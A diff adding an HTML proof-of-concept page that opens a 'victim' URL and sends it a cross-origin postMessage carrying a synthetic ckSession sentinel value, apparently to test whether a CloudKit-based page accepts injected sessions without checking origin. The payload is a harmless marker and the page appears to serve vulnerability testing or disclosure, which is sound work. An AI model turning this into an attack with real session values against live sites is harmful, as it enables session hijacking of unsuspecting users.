@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Cross-origin CloudKit message sender</title>
+<style>body{font:16px system-ui;max-width:700px;margin:40px auto;padding:0 18px}input,button{font:inherit;padding:10px;margin:6px 0;width:100%;box-sizing:border-box}pre{background:#111;color:#eee;padding:14px;border-radius:8px}</style>
+</head><body>
+<h1>Cross-origin sender</h1>
+<p>This page sends only a synthetic ckSession marker to a victim window you opened yourself.</p>
+<label>Victim URL</label><input id="victim" placeholder="https://cloudkit-poc-victim.vercel.app">
+<button id="open">Open victim</button>
+<button id="send">Send synthetic ckSession</button>
+<pre id="log"></pre>
+<script>
+"use strict";let victim=null;
+const params=new URLSearchParams(location.search);
+const presetVictim=params.get("victim")||"";
+if(presetVictim)document.getElementById("victim").value=presetVictim;
+const SENTINEL="OAI_REAL_ACCOUNT_TEST_CKSESSION_20260928";
+const log=x=>document.getElementById("log").textContent+=x+"\n";
+document.getElementById("open").onclick=()=>{const url=document.getElementById("victim").value.trim();if(!/^https:\/\//i.test(url)){log("enter the HTTPS victim URL first");return;}victim=window.open(url,"ck-victim");log("victim opened: "+url);};
+document.getElementById("send").onclick=()=>{if(!victim){log("open victim first");return;}victim.postMessage({ckSession:SENTINEL},"*");log("synthetic message sent");};
+</script></body></html>
